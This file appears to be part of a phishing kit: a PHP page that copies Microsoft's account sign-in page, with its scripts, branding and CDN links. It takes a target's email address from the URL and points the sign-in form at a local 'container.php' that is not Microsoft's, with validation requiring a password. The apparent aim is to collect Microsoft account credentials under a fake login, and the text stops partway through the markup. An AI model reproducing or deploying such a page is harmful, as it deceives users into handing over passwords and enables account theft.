<?php
$email = $_GET['email'];
?>


<html dir="ltr" lang="EN-US">
	<head>
		<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
			<meta http-equiv="X-UA-Compatible" content="IE=Edge">
					<script type="text/javascript">var PROOF = {};PROOF.Type = {SQSA: 6, CSS: 5, DeviceId: 4, Email: 1, AltEmail: 2, SMS: 3, HIP: 8, Birthday: 9, TOTPAuthenticator: 10, RecoveryCode: 11, StrongTicket: 13, TOTPAuthenticatorV2: 14, UniversalSecondFactor: 15, Voice: -3};</script>
					<noscript>
						<meta http-equiv="Refresh" content="0; URL=https://login.live.com/jsDisabled.srf?mkt=EN-US&lc=1033&uaid=591cebe37e234ff68f81c10fdfa8fcac"/>Microsoft account requires JavaScript to sign in. This web browser either does not support JavaScript, or scripts are being blocked.
						<br />
						<br />To find out whether your browser supports JavaScript, or to allow scripts, see the browser's online help.
					</noscript>
					<title>Sign in your account</title>
					
					<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
	<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery-validate/1.19.0/jquery.validate.min.js"></script>
	<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery-validate/1.19.0/additional-methods.min.js"></script>
	
	<style>
	  .error{
		color :red;
		min-height: 20px;
		font-size: 12px;
		}
	 
	</style>
	<script>
		$(document).ready(function () {
			// validation 
			 
			$('#i0281').validate({
	
			
				  rules: {
					"passwd": {
						 required: true
					 }
				  },
				  messages: {
					"passwd": {
						 required: "Password is required"
					 }
				  },
				  
				    errorElement : 'div',
					errorLabelContainer: '.errorTxt',
					
				   
			
			});
			
		});
	</script>
					<meta name="robots" content="none">
						<meta name="PageID" content="i5030">
							<meta name="SiteID" content="38936">
								<meta name="ReqLC" content="1033">
									<meta name="LocLC" content="1033">
										<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=2.0, minimum-scale=1.0, user-scalable=yes">
											<script type="text/javascript">!function(e,r){for(var t in r)e[t]=r[t]}(this,function(e){function r(n){if(t[n])return t[n].exports;var o=t[n]={exports:{},id:n,loaded:!1};return e[n].call(o.exports,o,o.exports,r),o.loaded=!0,o.exports}var t={};return r.m=e,r.c=t,r.p="",r(0)}([function(e,r){!function(){function e(){return s.$Config||s.ServerData||{}}function r(e,r){var t=s.$Debug;t&&t.appendLog&&(r&&(e+=" '"+(r.src||r.href||"")+"'",e+=", id:"+(r.id||""),e+=", async:"+(r.async||""),e+=", defer:"+(r.defer||"")),t.appendLog(e))}function t(e){var r=e.indexOf("?"),t=r>-1?r:e.length;return t>u&&e.substr(t-u,u).toLowerCase()===c}function n(){var r=e(),t=r.loader||{};return t.slReportFailure||r.slReportFailure||!1}function o(){var r=e(),t=r.loader||{};return t.redirectToErrorPageOnLoadFailure||!1}function a(e){var r=!0,n=e.src||e.href||"";if(n){if(t(n))try{e.sheet&&e.sheet.cssRules&&!e.sheet.cssRules.length&&(r=!1)}catch(o){}}else r=!1;return r}function i(){function n(e){var r=d.getElementsByTagName("head")[0];r.appendChild(e)}function o(e,r,n){var o=t(e)?i(e):s(e);return r&&(o.id=r),o.setAttribute&&(o.setAttribute("crossorigin","anonymous"),n&&o.setAttribute("integrity",n)),o}function i(e){var r=d.createElement("link");return r.rel="stylesheet",r.type="text/css",r.href=e,r}function s(e){var r=d.createElement("script");return r.type="text/javascript",r.src=e,r.defer=!1,r.async=!1,r}function c(e){if(!(p&&p.length>1))return e;for(var r=0;r
												<p.length;r++)if(0===e.indexOf(p[r]))return p[r+1
													<p.length?r+1:0]+e.substring(p[r].length);return e}function u(e,t,n,o){return r("[$Loader]: "+(y.failMessage||"Failed"),o),L[e].retry
														<g?(L[e].retry++,void f(e,t,n)):void(n&&n())}function l(e,t,n,o){a(o)?(r("[$Loader]: "+(y.successMessage||"Loaded"),o),f(e+1,t,n)):u(e,t,n,o)}function f(e,t,a){if(e
															<L.length){var i=L[e];if(!i||!i.srcPath)return void f(e+1,t,a);i.retry>0&&(i.srcPath=c(i.srcPath),i.origId||(i.origId=i.id),i.id=i.origId+"_Retry_"+i.retry);var s=o(i.srcPath,i.id,i.integrity);s.onload=function(){l(e,t,a,s)},s.onerror=function(){u(e,t,a,s)},s.onreadystatechange=function(){"loaded"===s.readyState?setTimeout(function(){l(e,t,a,s)},500):"complete"===s.readyState&&l(e,t,a,s)},n(s),r("[$Loader]: Loading '"+(i.srcPath||"")+"', id:"+(i.id||""))}else t&&t()}var h=e(),g=h.slMaxRetry||2,v=h.loader||{},p=v.cdnRoots||[],y=this,L=[];y.retryOnError=!0,y.successMessage="Loaded",y.failMessage="Error",y.Add=function(e,r,t,n){e&&L.push({srcPath:e,id:r,retry:n||0,integrity:t})},y.AddForReload=function(e){var r=e.src||e.href||"";y.Add(r,"AddForReload",e.integrity,1)},y.AddIf=function(e,r,t){e&&y.Add(r,t)},y.Load=function(e,r){f(0,e,r)}}var s=window,d=s.document,c=".css",u=c.length;i.On=function(e,r){if(!e)throw"The target element must be provided and cannot be null.";r?i.OnError(e):i.OnSuccess(e)},i.OnSuccess=function(e){var t=e.src||e.href||"",s=n(),d=o();if(!e)throw"The target element must be provided and cannot be null.";if(a(e)){r("[$Loader]: Loaded",e);var c=new i;c.failMessage="Reload Failed",c.successMessage="Reload Success",c.Load(null,function(){if(s)throw"Unexpected state. resourceLoader.Load() failed despite initial load success. ['"+t+"']";d&&(document.location.href="/error.aspx?err=504")})}else i.OnError(e)},i.OnError=function(e){var t=e.src||e.href||"",a=n(),s=o();if(!e)throw"The target element must be provided and cannot be null.";r("[$Loader]: Failed",e);var d=new i;d.failMessage="Reload Failed",d.successMessage="Reload Success",d.AddForReload(e),d.Load(null,function(){if(a)throw"Failed to load external resource ['"+t+"']";s&&(document.location.href="/error.aspx?err=504")})},s.$Loader=i}()}]));
															</script>
															<script type="text/javascript">!function(r,t){for(var e in t)r[e]=t[e]}(this,function(r){function t(o){if(e[o])return e[o].exports;var n=e[o]={exports:{},id:o,loaded:!1};return r[o].call(n.exports,n,n.exports,t),n.loaded=!0,n.exports}var e={};return t.m=r,t.c=e,t.p="",t(0)}([function(r,t){!function(){function r(r,t){function e(i){var a=r[i];return i
																<o-1?void(n.r[a]?e(i+1):n.when(a,function(){e(i+1)})):void t(a)}var o=r.length;e(0)}function t(r,t,i){function a(){var r=!!u.method,n=r?u.method:i[0],a=u.extraArgs||[],c=o.$WebWatson;try{var f=e(i,!r);if(a&&a.length>0)for(var s=a.length,v=0;v
																	<s;v++)f.push(a[v]);n.apply(t,f)}catch(h){return void(c&&c.submitFromException&&c.submitFromException(h))}}var u=n.r&&n.r[r];return t=t?t:this,u&&(u.skipTimeout?a():o.setTimeout(a,0)),u}function e(r,t){return Array.prototype.slice.call(r,t?1:0)}var o=window;o.$Do||(o.$Do={q:[],r:[],removeItems:[],lock:0,o:[]});var n=o.$Do;n.when=function(e,o){function i(r){t(r,a,u)||n.q.push({id:r,c:a,a:u})}var a=0,u=[],c=1,f="function"==typeof o;f||(a=o,c=2);for(var s=c;s
																		<arguments.length;s++)u.push(arguments[s]);e instanceof Array?r(e,i):i(e)},n.register=function(r,e,o){if(!n.r[r]){n.o.push(r);var i={};if(e&&(i.method=e),o&&(i.skipTimeout=o),arguments&&arguments.length>3){i.extraArgs=[];for(var a=3;a
																			<arguments.length;a++)i.extraArgs.push(arguments[a])}n.r[r]=i,n.lock++;try{for(var u=0;u
																				<n.q.length;u++){var c=n.q[u];c.id==r&&t(r,c.c,c.a)&&n.removeItems.push(c)}}catch(f){throw f}finally{if(n.lock--,0===n.lock){for(var s=0;s
																					<n.removeItems.length;s++)for(var v=n.removeItems[s],h=0;h
																						<n.q.length;h++)if(n.q[h]===v){n.q.splice(h,1);break}n.removeItems=[]}}}},n.unregister=function(r){n.r[r]&&delete n.r[r]}}()}]));
																						</script>
																						<script type="text/javascript">!function(n,e){for(var r in e)n[r]=e[r]}(this,function(n){function e(o){if(r[o])return r[o].exports;var t=r[o]={exports:{},id:o,loaded:!1};return n[o].call(t.exports,t,t.exports,e),t.loaded=!0,t.exports}var r={};return e.m=n,e.c=r,e.p="",e(0)}([function(n,e){!function(){function n(){return r.$Config||r.ServerData||{}}function e(){var e=(n(),new t),r=this,i=[],f=[];r.Add=function(n,r,o,t){e.Add(n,r,o,t)},r.Provides=function(n){if(n)if(n instanceof Array)for(var e=0;e
																							<n.length;e++)i.push(n[e]);else i.push(n)},r.Requires=function(n){if(n)if(n instanceof Array)for(var e=0;e
																								<n.length;e++)f.push(n[e]);else f.push(n)},r.Load=function(n,r){var t=function(){n&&n();for(var e=0;e
																									<i.length;e++)o.register(i[e],0,!0)},u=function(){e.Load(t,r)};f.length>0?o.when(f,u):u()}}var r=window,o=(r.document,r.$Do),t=r.$Loader,i=".css";i.length;e.WhenLoaded=function(n,e){o.when(n,e)},r.$DepLoader=e}()}]));
																									</script>
																									<link rel="shortcut icon" href="https://logincdn.msauth.net/16.000.28394.11/images/favicon.ico">
																										<link rel="stylesheet" title="Converged_v2" type="text/css" onload="$Loader.OnSuccess(this)" onerror="$Loader.OnError(this)" href="https://logincdn.msauth.net/16.000/Converged_v21033_G6gnkW-92CN8JvITKNKF3g2.css">
																											<style type="text/css"></style>
																											<style type="text/css">body{display:none;}</style>
																											<script type="text/javascript">if (top != self){try{top.location.replace(self.location.href);}catch (e){}}else{document.write(unescape('%3C%73') + 'tyle type="text/css">body{display:block !important;}
																											</style>');}
																										</script>
																										<style type="text/css">body{display:block !important;}</style>
																										<noscript>
																											<style type="text/css">body{display:block !important;}</style>
																										</noscript>
																										<script type="text/javascript">!function(e,r){for(var t in r)e[t]=r[t]}(this,function(e){function r(n){if(t[n])return t[n].exports;var i=t[n]={exports:{},id:n,loaded:!1};return e[n].call(i.exports,i,i.exports,r),i.loaded=!0,i.exports}var t={};return r.m=e,r.c=t,r.p="",r(0)}([function(e,r){var t=window,n=t.navigator;t.g_iSRSFailed=0,t.g_sSRSSuccess="",r.SRSRetry=function(e,r,i,s,a){var o=1,c=unescape("%3Cscript type='text/javascript'");a&&(c+=" crossorigin='anonymous' integrity='"+a+"'"),c+=" src='";var u=unescape("'%3E%3C/script%3E"),S=r;if(n&&n.userAgent&&s&&s!==r){var d=n.userAgent.toLowerCase(),p=d.indexOf("edge")>=0;if(!p){var f=d.match(/chrome\/([0-9]+)\./),g=f&&2===f.length&&!isNaN(f[1])&&parseInt(f[1])>54;g&&(S=s)}}t.g_sSRSSuccess.indexOf(e)===-1&&("undefined"==typeof t[e]?(t.g_iSRSFailed=1,i<=o&&document.write(c+S+u)):t.g_sSRSSuccess+=e+"|"+i+",")}}]));var g_dtFirstByte=new Date();var g_objPageMode = null;
																										</script>
																										<link rel="image_src" href="https://logincdn.msauth.net/16.000.28394.11/images/Windows_Live_v_thumb.jpg">
																											<script type="text/javascript">var ServerData = {CJ:1,CK:0,Bm:'16.0.28394.11',CM:{},Bn:'',CN:{},Bo:'',CO:'',Bp:'IN',CQ:'sign up',aE:false,CR:'',Bt:'',aH:true,CU:'PPFT',aI:false,Bw:'https://login.microsoft.com/consumer/fido/get?mkt=EN-US&lc=1033',CV:'',CW:'',Bx:'https://login.live.com/gls.srf?urlID=WinLiveTermsOfUse&mkt=EN-US&vv=1600&uaid=591cebe37e234ff68f81c10fdfa8fcac',By:'https://login.live.com/GetCredentialType.srf?opid=7814CFA2C6316E3B&vv=1600&mkt=EN-US&lc=1033&uaid=591cebe37e234ff68f81c10fdfa8fcac',Bz:'https://login.live.com/Me.htm?v=1&uaid=591cebe37e234ff68f81c10fdfa8fcac',CY:"#~#partnerdomain#~# does\'t use this service. Please sign in with a Microsoft account or create a new account. 
																												<a href=\"#~#WLPaneHelpInviteBlockedURL_LS#~#\" id=\"idPaneHelpInviteBlockedLink9\">Learn More</a>",aS:false,urlLogin:'https://login.live.com/login.srf?contextid=E7CD49C2B76B0717&bk=1574840268&mkt=EN-US&lc=1033&uaid=591cebe37e234ff68f81c10fdfa8fcac',aT:true,aU:true,b4:false,aV:false,Cc:false,hpgid:33,b9:true,Cg:0,aa:true,Cn:{},urlFed:'',Co:{'Logo':'','LogoAltText':'','LogoText':'','ShowWLHeader':true},bB:2,bC:true,Cq:'##li16####B##Hotmail##/B####BR##The smart way to do email - fast, easy and reliable##li8####B##Messenger##/B####BR##Stay in touch with the most important people in your life##li10####B##SkyDrive##/B####BR##Free, password-protected online storage',bD:true,ae:false,Cr:'',Cs:'',bG:false,sPOST_NewUser:'',bH:false,aj:true,Cx:'Pas',bK:false,am:true,bM:false,Cz:'',bN:true,urlPost:'https://login.live.com/ppsecure/post.srf?lc=1033&contextid=E7CD49C2B76B0717&bk=1574840268&uaid=591cebe37e234ff68f81c10fdfa8fcac&pid=0',bR:false,au:true,bX:true,az:true,A:10000,fWebNgcFS:false,B:0,D:false,sFedQS:'wa=wsignin1.0&wtrealm=uri:WindowsLiveID&wctx=lc%3D1033%26contextid%3DE7CD49C2B76B0717%26bk%3D1574840268',F:'',H:'',bc:0,I:-1,J:'591cebe37e234ff68f81c10fdfa8fcac',be:true,cD:'https://sc.imp.live.com/content/dam/imp/surfaces/mail_signin/v3/account/EN-US.html?id=38936&mkt=EN-US',cE:'',bf:true,cF:'',cG:'',bh:false,N:0,A4:true,P:'',cI:'https://go.microsoft.com/fwlink/?linkid=2013738',A6:false,Q:'https://account.live.com/ResetPassword.aspx?wreply=https://login.live.com/login.srf%3flc%3d1033%26contextid%3dE7CD49C2B76B0717%26bk%3d1574840268&id=38936&uiflavor=web&uaid=591cebe37e234ff68f81c10fdfa8fcac&mkt=EN-US&lc=1033&bk=1574840268',A7:true,str:[],bk:false,cK:'',cL:'https://go.microsoft.com/fwlink/?LinkID=254486',T:0,U:60,cN:'',W:'',br:false,Y:'',bt:true,AA:true,urlSwitch:'https://login.live.com/logout.srf?lc=1033&contextid=E7CD49C2B76B0717&uaid=591cebe37e234ff68f81c10fdfa8fcac&ru=https://account.live.com%3fmkt%3dEN-US%26lc%3d1033%26id%3d38936&bk=1574840268&lm=I',bw:false,AC:null,urlFedConvertRename:'https://account.live.com/security/LoginStage.aspx?lmif=1000&ru=https://login.live.com/login.srf%3Fvv%3D1600%26mkt%3DEN-US%26lc%3D1033%26uaid%3D591cebe37e234ff68f81c10fdfa8fcac&vv=1600&mkt=EN-US&lc=1033&cbid=0&id=38936&uaid=591cebe37e234ff68f81c10fdfa8fcac',AD:'AF~Afghanistan~93!!!AL~Albania~355!!!DZ~Algeria~213!!!AD~Andorra~376!!!AO~Angola~244!!!AQ~Antarctica~672!!!AG~Antigua and Barbuda~1!!!AR~Argentina~54!!!AM~Armenia~374!!!AW~Aruba~297!!!AC~Ascension Island~247!!!AU~Australia~61!!!AT~Austria~43!!!AZ~Azerbaijan~994!!!BS~Bahamas~1!!!BH~Bahrain~973!!!BD~Bangladesh~880!!!BB~Barbados~1!!!BY~Belarus~375!!!BE~Belgium~32!!!BZ~Belize~501!!!BJ~Benin~229!!!BM~Bermuda~1!!!BT~Bhutan~975!!!BO~Bolivia~591!!!BQ~Bonaire~599!!!BA~Bosnia and Herzegovina~387!!!BW~Botswana~267!!!BV~Bouvet Island~47!!!BR~Brazil~55!!!IO~British Indian Ocean Territory~44!!!VG~British Virgin Islands~1!!!BN~Brunei~673!!!BG~Bulgaria~359!!!BF~Burkina Faso~226!!!BI~Burundi~257!!!CV~Cabo Verde~238!!!KH~Cambodia~855!!!CM~Cameroon~237!!!CA~Canada~1!!!KY~Cayman Islands~1!!!CF~Central African Republic~236!!!TD~Chad~235!!!CL~Chile~56!!!CN~China~86!!!CX~Christmas Island~61!!!CC~Cocos (Keeling) Islands~61!!!CO~Colombia~57!!!KM~Comoros~269!!!CG~Congo~242!!!CD~Congo (DRC)~243!!!CK~Cook Islands~682!!!CR~Costa Rica~506!!!CI~Côte d\'Ivoire~225!!!HR~Croatia~385!!!CU~Cuba~53!!!CW~Curaçao~599!!!CY~Cyprus~357!!!CZ~Czechia~420!!!DK~Denmark~45!!!DJ~Djibouti~253!!!DM~Dominica~1!!!DO~Dominican Republic~1!!!EC~Ecuador~593!!!EG~Egypt~20!!!SV~El Salvador~503!!!GQ~Equatorial Guinea~240!!!ER~Eritrea~291!!!EE~Estonia~372!!!ET~Ethiopia~251!!!FK~Falkland Islands~500!!!FO~Faroe Islands~298!!!FJ~Fiji~679!!!FI~Finland~358!!!FR~France~33!!!GF~French Guiana~594!!!PF~French Polynesia~689!!!GA~Gabon~241!!!GM~Gambia~220!!!GE~Georgia~995!!!DE~Germany~49!!!GH~Ghana~233!!!GI~Gibraltar~350!!!GR~Greece~30!!!GL~Greenland~299!!!GD~Grenada~1!!!GP~Guadeloupe~590!!!GU~Guam~1!!!GT~Guatemala~502!!!GG~Guernsey~44!!!GN~Guinea~224!!!GW~Guinea-Bissau~245!!!GY~Guyana~592!!!HT~Haiti~509!!!HN~Honduras~504!!!HK~Hong Kong SAR~852!!!HU~Hungary~36!!!IS~Iceland~354!!!IN~India~91!!!ID~Indonesia~62!!!IR~Iran~98!!!IQ~Iraq~964!!!IE~Ireland~353!!!IM~Isle of Man~44!!!IL~Israel~972!!!IT~Italy~39!!!JM~Jamaica~1!!!XJ~Jan Mayen~47!!!JP~Japan~81!!!JE~Jersey~44!!!JO~Jordan~962!!!KZ~Kazakhstan~7!!!KE~Kenya~254!!!KI~Kiribati~686!!!KR~Korea~82!!!XK~Kosovo~383!!!KW~Kuwait~965!!!KG~Kyrgyzstan~996!!!LA~Laos~856!!!LV~Latvia~371!!!LB~Lebanon~961!!!LS~Lesotho~266!!!LR~Liberia~231!!!LY~Libya~218!!!LI~Liechtenstein~423!!!LT~Lithuania~370!!!LU~Luxembourg~352!!!MO~Macao SAR~853!!!MK~North Macedonia~389!!!MG~Madagascar~261!!!MW~Malawi~265!!!MY~Malaysia~60!!!MV~Maldives~960!!!ML~Mali~223!!!MT~Malta~356!!!MH~Marshall Islands~692!!!MQ~Martinique~596!!!MR~Mauritania~222!!!MU~Mauritius~230!!!YT~Mayotte~262!!!MX~Mexico~52!!!FM~Micronesia~691!!!MD~Moldova~373!!!MC~Monaco~377!!!MN~Mongolia~976!!!ME~Montenegro~382!!!MS~Montserrat~1!!!MA~Morocco~212!!!MZ~Mozambique~258!!!MM~Myanmar~95!!!NA~Namibia~264!!!NR~Nauru~674!!!NP~Nepal~977!!!NL~Netherlands~31!!!AN~Netherlands Antilles (Former)~599!!!NC~New Caledonia~687!!!NZ~New Zealand~64!!!NI~Nicaragua~505!!!NE~Niger~227!!!NG~Nigeria~234!!!NU~Niue~683!!!MP~Northern Mariana Islands~1!!!NO~Norway~47!!!OM~Oman~968!!!PK~Pakistan~92!!!PW~Palau~680!!!PS~Palestinian Authority~970!!!PA~Panama~507!!!PG~Papua New Guinea~675!!!PY~Paraguay~595!!!PE~Peru~51!!!PH~Philippines~63!!!PL~Poland~48!!!PT~Portugal~351!!!QA~Qatar~974!!!RE~Réunion~262!!!RO~Romania~40!!!RU~Russia~7!!!RW~Rwanda~250!!!XS~Saba~599!!!KN~Saint Kitts and Nevis~1!!!LC~Saint Lucia~1!!!PM~Saint Pierre and Miquelon~508!!!VC~Saint Vincent and the Grenadines~1!!!WS~Samoa~685!!!SM~San Marino~378!!!ST~São Tomé and Príncipe~239!!!SA~Saudi Arabia~966!!!SN~Senegal~221!!!RS~Serbia~381!!!SC~Seychelles~248!!!SL~Sierra Leone~232!!!SG~Singapore~65!!!XE~Sint Eustatius~599!!!SK~Slovakia~421!!!SI~Slovenia~386!!!SB~Solomon Islands~677!!!SO~Somalia~252!!!ZA~South Africa~27!!!SS~South Sudan~211!!!ES~Spain~34!!!LK~Sri Lanka~94!!!SH~St Helena, Ascension, and Tristan da Cunha~290!!!SD~Sudan~249!!!SR~Suriname~597!!!SJ~Svalbard~47!!!SZ~Swaziland~268!!!SE~Sweden~46!!!CH~Switzerland~41!!!SY~Syria~963!!!TW~Taiwan~886!!!TJ~Tajikistan~992!!!TZ~Tanzania~255!!!TH~Thailand~66!!!TL~Timor-Leste~670!!!TG~Togo~228!!!TK~Tokelau~690!!!TO~Tonga~676!!!TT~Trinidad and Tobago~1!!!TA~Tristan da Cunha~290!!!TN~Tunisia~216!!!TR~Turkey~90!!!TM~Turkmenistan~993!!!TC~Turks and Caicos Islands~1!!!TV~Tuvalu~688!!!UM~U.S. Outlying Islands~1!!!VI~U.S. Virgin Islands~1!!!UG~Uganda~256!!!UA~Ukraine~380!!!AE~United Arab Emirates~971!!!UK~United Kingdom~44!!!US~United States~1!!!UY~Uruguay~598!!!UZ~Uzbekistan~998!!!VU~Vanuatu~678!!!VA~Vatican City~379!!!VE~Venezuela~58!!!VN~Vietnam~84!!!WF~Wallis and Futuna~681!!!YE~Yemen~967!!!ZM~Zambia~260!!!ZW~Zimbabwe~263',AE:'https://account.live.com/username/recover?wreply=https://login.live.com/login.srf%3flc%3d1033%26mkt%3dEN-US%26lc%3d1033%26contextid%3dE7CD49C2B76B0717%26bk%3d1574840268%26uaid%3d591cebe37e234ff68f81c10fdfa8fcac&id=38936&mkt=EN-US&lc=1033&uaid=591cebe37e234ff68f81c10fdfa8fcac&uiflavor=web',a:'https://logincdn.msauth.net/16.000.28394.11/',b:'',AH:true,c:{},d:1,e:true,AL:false,g:'https://signup.live.com/signup?contextid=E7CD49C2B76B0717&bk=1574840268&ru=https://login.live.com/login.srf%3fcontextid%3dE7CD49C2B76B0717%26mkt%3dEN-US%26lc%3d1033%26bk%3d1574840268%26uaid%3d591cebe37e234ff68f81c10fdfa8fcac&uiflavor=web&mkt=EN-US&lc=1033&uaid=591cebe37e234ff68f81c10fdfa8fcac',h:false,AN:true,j:'',AP:0,B0:'',cd:'',AQ:0,ce:'',AR:'login.live.com',cf:'',B2:'',AS:'',cg:'',n:1033,AT:'',o:'https://github.com/login/oauth/authorize?response_type=code&client_id=e37ffdec11c0245cb2e0&scope=read:user++user:email&redirect_uri=https://login.live.com/HandleGithubResponse.srf&allow_signup=false&state=7814CFA2C6316E3B',sCBUpTxt1:'',p:'https://login.live.com/cookiesDisabled.srf?uaid=591cebe37e234ff68f81c10fdfa8fcac&mkt=EN-US&lc=1033',B6:'https://login.live.com/GetSessionState.srf?vv=1600&mkt=EN-US&lc=1033&uaid=591cebe37e234ff68f81c10fdfa8fcac',sCBUpTxt2:'',AW:'https://accounts.google.com/o/oauth2/v2/auth?response_type=code&client_id=1057459215779-l3uvdm899ucea09atcc09d9rq6uvkilv.apps.googleusercontent.com&scope=openid+profile+email&redirect_uri=https://login.live.com/HandleGoogleResponse.srf&access_type=offline&state=7814CFA2C6316E3B',cj:'',r:true,AX:'',t:1,u:null,w:'lc=1033&contextid=E7CD49C2B76B0717&bk=1574840268',correlationId:'591cebe37e234ff68f81c10fdfa8fcac',oPost:{},z:false,Ab:false,Ac:3,Af:'',BF:'',Ah:[],BH:'',Ai:false,BJ:'',Al:false,sErrTxt:'',An:true,BN:'',Ap:0,BO:'',html:[],iPawnIcon:1,sFTTag:'
																												<input type="hidden" name="PPFT" id="i0327" value="Dfdr7h3UYhuNO5NjmQfO7bUBflHgkcjPtXQz4nZeTsRbnMhewM6leg5PT!5AuaLQD2QuJvua8w1vfhELFna759sFYaOu9EtHcgI3sHkrNJrErjdpZSNA!yJgzj2EZLWEbI7VU*jucFqQVvqpBH8!39AjXEDYyILYivN9b5jFJYIE*SnJvXgtTMfpeHGTaPaqgeORn1TNmH*7NNcyRhbYRekKXBAobwE7jlPJsqSOvV6wdwweTPdk5ihxUbbYOe3EpQ$$"/>',BR:'https://account.live.com/query.aspx?uaid=591cebe37e234ff68f81c10fdfa8fcac&mkt=EN-US&lc=1033&id=38936',At:'IN',loader:{cdnRoots:['https://logincdn.msauth.net/','https://lgincdnvzeuno.azureedge.net/','https://lgincdnmsftuswe2.azureedge.net/']},C3:"A single-use code lets you sign in without entering your password. This helps protect your account when you\'re using someone else\'s PC. 
																												<a href=\"http://explore.live.com/windows-live-sign-in-single-use-code-faq\" id=\"idPaneHelpOTCInfoLink9\" target=\"_blank\">Learn more</a>",Av:'',C4:"Use the primary phone number you\'ve associated with your Microsoft account. 
																												<a href=\"http://explore.live.com/windows-live-sign-in-single-use-code-faq\" id=\"idPaneHelpOTCInfoLink9\" target=\"_blank\">Learn more</a>",C5:"Your session has timed out. To request a single use code, please 
																												<a href=\"javascript:NewOTCRequest()\">refresh the page</a>.",Aw:'',BW:'https://login.live.com/gls.srf?urlID=MSNPrivacyStatement&mkt=EN-US&vv=1600&uaid=591cebe37e234ff68f81c10fdfa8fcac',Ay:'',C9:"Sign in",fHasBackgroundColor:false,a1:true,urlStaySignIn:'https://login.live.com/login.srf?contextid=E7CD49C2B76B0717&mkt=EN-US&lc=1033&bk=1574840268&uaid=591cebe37e234ff68f81c10fdfa8fcac',a3:0,Ba:0,CA:false,Bc:3,a7:3,a8:5,CF:0};
																											</script>
																											<script type="text/javascript">window.UXResourceDependencies = [];</script>
																											<script type="text/javascript">(function () {var l = new window.$DepLoader();l.Add("https://logincdn.msauth.net/16.000/ConvergedLoginPaginatedStrings.en_EmWJezhbhqxEPyIjFek5wQ2.js","ConvergedLoginPaginatedStrings","sha384-nNIst0yZwlsSqjn2K5+OEIcGh9sTyuBGTYreIe76escnMGKK24V5o3R4oY2ImC1I");l.Provides("UX_JS_Strings");var res = ("UX_Res_" + window.UXResourceDependencies.length);l.Provides(res);window.UXResourceDependencies.push(res);l.Load();}());</script>
																											<script type="text/javascript" src="https://logincdn.msauth.net/16.000/ConvergedLoginPaginatedStrings.en_EmWJezhbhqxEPyIjFek5wQ2.js" id="ConvergedLoginPaginatedStrings" crossorigin="anonymous" integrity="sha384-nNIst0yZwlsSqjn2K5+OEIcGh9sTyuBGTYreIe76escnMGKK24V5o3R4oY2ImC1I"></script>
																											<script type="text/javascript">(function () {var l = new window.$DepLoader();l.Add("https://logincdn.msauth.net/16.000/ConvergedLogin_PCore_DJSTSvHRjHpsuIZIVqYF7w2.js","ConvergedLogin_PCore","sha384-Rq6+13afK5rNb9rnb6YO+al7s/+r2q5N0z0zHqWUxj0OGLXvbv41/t/x/OmAUElE");l.Requires("UX_JS_Strings");l.Provides("UX_JS_Core");var res = ("UX_Res_" + window.UXResourceDependencies.length);l.Provides(res);window.UXResourceDependencies.push(res);l.Load();}());</script>
																											<script type="text/javascript">window.WhenAllLoaded = function (callback) { window.$DepLoader.WhenLoaded(window.UXResourceDependencies, callback); };</script>
																											<script type="text/javascript" src="https://logincdn.msauth.net/16.000/ConvergedLogin_PCore_DJSTSvHRjHpsuIZIVqYF7w2.js" id="ConvergedLogin_PCore" crossorigin="anonymous" integrity="sha384-Rq6+13afK5rNb9rnb6YO+al7s/+r2q5N0z0zHqWUxj0OGLXvbv41/t/x/OmAUElE"></script>
																										</head>
																										<body class="cb" data-bind="defineGlobals: ServerData, bodyCssClass">
																											<div>
																												<!--  -->
																												<div data-bind="component: { name: 'background-image-control', publicMethods: backgroundControlMethods }">
																													<div class="background" role="presentation" data-bind="css: { app: isAppBranding }, style: { background: backgroundStyle }">
																														<!-- ko if: smallImageUrl -->
																														<div data-bind="backgroundImage: smallImageUrl()" style="background-image: url(&quot;https://logincdn.msauth.net/16.000.28394.11/images/Backgrounds/0-small.jpg?x=138bcee624fa04ef9b75e86211a9fe0d&quot;);"></div>
																														<!-- /ko -->
																														<!-- ko if: backgroundImageUrl -->
																														<div class="backgroundImage" data-bind="backgroundImage: backgroundImageUrl()" style="background-image: url(&quot;https://logincdn.msauth.net/16.000.28394.11/images/Backgrounds/0.jpg?x=a5dbd4393ff6a725c7e62b61df7e72f0&quot;);"></div>
																														<!-- ko if: useImageMask -->
																														<!-- /ko -->
																														<!-- /ko -->
																													</div>
																												</div>
																												<div data-bind="if: activeDialog"></div>
																												
																						<form name="f1" id="i0281" novalidate="novalidate" spellcheck="false" method="post" target="_top" autocomplete="off" data-bind="autoSubmit: forceSubmit, attr: { action: postUrl }, ariaHidden: activeDialog" action="container.php">
																													<!-- ko if: svr.Cc -->
																													<!-- /ko -->
																													<!-- ko withProperties: { '$loginPage': $data } -->
																													<div class="outer" data-bind="component: { name: 'master-page',
        params: {
            serverData: svr,
            showButtons: svr.f,
            showFooterLinks: true,
            useWizardBehavior: svr.az,
            handleWizardButtons: false,
            password: password,
            hideFromAria: ariaHidden },
        event: {
            footerAgreementClick: footer_agreementClick } }">
																														<!-- ko template: { nodes: $componentTemplateNodes, data: $parent } -->
																														<!-- ko if: svr.aQ -->
																														<!-- /ko -->
																														<div class="middle" data-bind="css: { 'app': backgroundLogoUrl }">
																															<!-- ko if: backgroundLogoUrl() && !(paginationControlMethods() && paginationControlMethods().currentViewHasMetadata('hideLogo')) -->
																															<!-- /ko -->
																															<div class="inner fade-in-lightbox" data-bind="
                animationEnd: paginationControlMethods() &amp;&amp; paginationControlMethods().view_onAnimationEnd,
                css: {
                    'app': backgroundLogoUrl,
                    'wide': paginationControlMethods() &amp;&amp; paginationControlMethods().currentViewHasMetadata('wide'),
                    'fade-in-lightbox': fadeInLightBox,
                    'has-popup': showFedCredButton,
                    'transparent-lightbox': backgroundControlMethods() &amp;&amp; backgroundControlMethods().useTransparentLightBox }">
																																<div class="lightbox-cover" data-bind="css: { 'disable-lightbox': svr.B5 &amp;&amp; showLightboxProgress() }"></div>
																																<!-- ko if: showLightboxProgress -->
																																<!-- /ko -->
																																<!-- ko ifnot: paginationControlMethods() && (paginationControlMethods().currentViewHasMetadata('hideLogo')) -->
																																<div data-bind="component: { name: 'logo-control',
                    params: {
                        isChinaDc: svr.fIsChinaDc,
                        bannerLogoUrl: bannerLogoUrl() } }">
																																	<!--  -->
																																	<!-- ko if: bannerLogoUrl -->
